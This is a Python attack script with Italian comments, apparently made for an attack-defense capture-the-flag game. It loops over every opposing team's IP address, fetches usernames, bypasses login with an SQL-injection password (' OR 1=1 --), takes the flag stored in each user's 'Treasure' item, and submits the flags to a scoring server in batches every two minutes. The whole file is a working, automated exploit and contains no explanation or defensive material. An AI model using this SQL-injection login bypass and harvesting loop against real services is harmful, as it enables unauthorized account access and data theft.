import requests
import json
import time 

#! --- inserimento shit qui ---

TEAM_TOKEN = '' #!Ricorda da cambiare
TARGET_TEAMS = [str(i) for i in range(80) if i not in [31, 32]] #lista di tutti i team possibili, escludendo i nostri (31 e 32)

PORT_API = '5050' #porta del BACKEND !!!!!!!! 

#Prima lo script collezionava le flag di tutti i team e poi li inviava tutti in una botta, mo che le prendeva tutte metà sono già scadute
#Ora lo script attacca CHUNK_SIZE team alla volta e invia le loro flag fino alla fine 

CHUNK_SIZE = 10  

MAX_TIMEOUT = 2 #self explanatory direi, non si applica per il get di flag_ids.
#! ------------------------------------------



FLAG_IDS_URL = 'http://10.10.0.1:8081/flagIds'
SUBMIT_URL = 'http://10.10.0.1:8080/flags'

def debug(msg, status="INFO"): #?Questa funzione è solo per scopi estetici così il terminale è colorato
    colors = {"INFO": "\033[94m", "OK": "\033[92m", "ERR": "\033[91m", "WARN": "\033[93m", "END": "\033[0m"}
    print(f"{colors.get(status, '')}[{status}] {msg}{colors['END']}")

def get_username(ip, user_id):
    url = f"http://{ip}:{PORT_API}/api/user/{user_id}"
    try:
        r = requests.get(url, timeout=MAX_TIMEOUT)
        if r.status_code == 200:
            return r.json().get('user')
    except:
        pass
    return None

def submit_flags(flags_to_send):
    
    if not flags_to_send:
        return
    debug(f"Sottomissione chunk di {len(flags_to_send)} flag...", "INFO")
    try:
        res = requests.put(SUBMIT_URL, 
                           headers={'X-Team-Token': TEAM_TOKEN}, 
                           json=flags_to_send, 
                           timeout=10)
        debug(f"Risposta server: {res.text}", "OK")
    except Exception as e:
        debug(f"Errore sottomissione: {e}", "ERR")

def exploit_team(team_id, users_dict, current_chunk_flags):
    team_ip = f"10.60.{team_id}.1"
    debug(f"Attacco Team {team_id} ({team_ip})...", "INFO")
    
    for tick, info in users_dict.items():
        uid = info.get('user_id')
        username = get_username(team_ip, uid)
        
        if not username:
            continue
            
        session = requests.Session()
        try:
            # Login Bypass SQLi
            login_payload = {"username": username, "password": "' OR 1=1 --"}
            l_res = session.post(f"http://{team_ip}:{PORT_API}/api/login", json=login_payload, timeout=MAX_TIMEOUT)
            
            if l_res.status_code == 200:
                #Ottenimento item utente, la flag sta nella treasure non nella black flag
                i_res = session.get(f"http://{team_ip}:{PORT_API}/api/user/items", timeout=MAX_TIMEOUT)
                if i_res.status_code == 200:
                    items = i_res.json().get('items', [])
                    for item in items:
                        if item.get('name') == "Treasure":
                            flag = item.get('personal_description')
                            if flag and flag not in current_chunk_flags:
                                debug(f"Flag catturata: {flag[:15]}...", "OK")
                                current_chunk_flags.append(flag)
        except:
            continue

def main():
    try:
        r = requests.get(FLAG_IDS_URL, timeout=5)
        all_targets = r.json().get("SeaOfHackerz", {})
    except Exception as e:
        debug(f"Errore caricamento target: {e}", "ERR") #(╯°□°）╯︵ ┻━┻ 
        return

    captured_chunk = []
    
    
    for index, team_id in enumerate(TARGET_TEAMS, start=1):
        team_data = all_targets.get(team_id)
        if team_data:
            exploit_team(team_id, team_data, captured_chunk)
        
        # Ogni CHUNK SIZE teams invia le flag e svuota la lista 
        if index % CHUNK_SIZE == 0:
            print("-" * 30)
            debug(f"Raggiunto limite chunk ({CHUNK_SIZE} team).", "INFO")
            submit_flags(captured_chunk)
            captured_chunk = [] # Reset per il prossimo blocco
            print("-" * 30)

    # Invia le flag rimanenti (per l'ultimo blocco che potrebbe essere < 10)
    if captured_chunk:
        debug("Invio ultime flag rimanenti...", "INFO")
        submit_flags(captured_chunk)

if __name__ == "__main__":
    while True:
        main()
        debug("Attesa tattica di due minuti", "INFO")
        time.sleep(120)